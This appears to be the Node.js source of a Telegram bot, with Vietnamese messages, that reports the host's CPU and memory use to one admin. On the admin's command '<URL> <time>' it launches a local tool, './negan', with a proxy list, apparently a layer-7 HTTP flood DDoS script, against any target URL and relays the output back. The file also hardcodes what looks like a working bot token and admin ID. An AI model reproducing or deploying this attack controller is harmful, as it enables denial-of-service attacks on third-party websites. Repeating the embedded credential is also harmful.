const TelegramBot = require('node-telegram-bot-api'), { spawn } = require('child_process'), os = require('os');
const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc', bot = new TelegramBot(token, { polling: true }), adminId = 7371969470;

const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory, memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => { const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle; return acc + (100 - (idle / total) * 100); }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
}, 14000);

bot.on('message', (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
    const parts = text.split(' ');
    if (parts.length !== 2 || !parts[0].startsWith('http')) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
    const [host, time] = parts;
    if (!host.startsWith('http://') && !host.startsWith('https://')) return bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
    const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
    console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
    const child = spawn('node', ['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', time]);
    bot.sendMessage(chatId, `🚀 Lệnh đã được gửi thành công: ${command}`);
    child.stdout.on('data', (data) => { console.log(`[DEBUG] stdout: ${data.toString()}`); bot.sendMessage(chatId, `[stdout] ${data.toString()}`); });
    child.stderr.on('data', (data) => { console.error(`[DEBUG] stderr: ${data.toString()}`); bot.sendMessage(chatId, `[stderr] ${data.toString()}`); });
    child.on('close', (code) => { console.log(`[DEBUG] Lệnh đã kết thúc với mã thoát: ${code}`); bot.sendMessage(chatId, `✅ Lệnh đã hoàn thành với mã thoát: ${code}`); });
});
